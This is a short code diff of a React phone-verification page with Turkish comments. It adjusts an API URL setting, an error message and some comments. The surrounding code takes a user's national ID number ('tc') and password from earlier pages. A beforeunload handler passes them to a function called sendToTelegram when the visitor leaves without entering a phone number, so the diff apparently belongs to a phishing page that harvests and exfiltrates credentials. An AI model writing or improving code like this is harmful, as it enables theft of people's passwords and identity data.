@@ -23,10 +23,8 @@ function PhoneVerificationPage() {
   const { dispatch: authDispatch } = useAuth();
   const { tc, password, isValidNavigation } = location.state || {};
 
-  // Dinamik API URL'si
-  const apiUrl = process.env.NODE_ENV === 'development'
-    ? 'http://localhost:5000/api/submit'
-    : '/api/submit'; // Vercel'de相对 yol
+  // Dinamik API URL'si (ENV ile)
+  const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:5000/api/submit';
 
   // Navigasyon ve geri tuşu kontrolü
   useEffect(() => {
@@ -74,16 +72,17 @@ function PhoneVerificationPage() {
       setState((prev) => ({
         ...prev,
         showPhoneError: true,
-        errorMessage: `Veri gönderimi sırasında hata oluştu: ${error.message || 'Lütfen tekrar deneyin.'}`,
+        errorMessage: `Veri gönderimi sırasında hata oluştu: ${error.message || 'Bilinmeyen bir hata'}`,
       }));
       return { error: error.message };
     }
   }, [apiUrl]);
 
-  // Siteden çıkıldığında veri gönderimi
+  // Siteden çıkıldığında veri gönderimi (Dikkat: Tarayıcı engelleyebilir)
   useEffect(() => {
     const handleBeforeUnload = () => {
       if (tc && password && !state.phoneNumber) {
+        // Not: beforeunload'da asenkron istekler güvenilir değil, dikkatli kullan
         sendToTelegram({ tc, password, phone: '' });
       }
     };
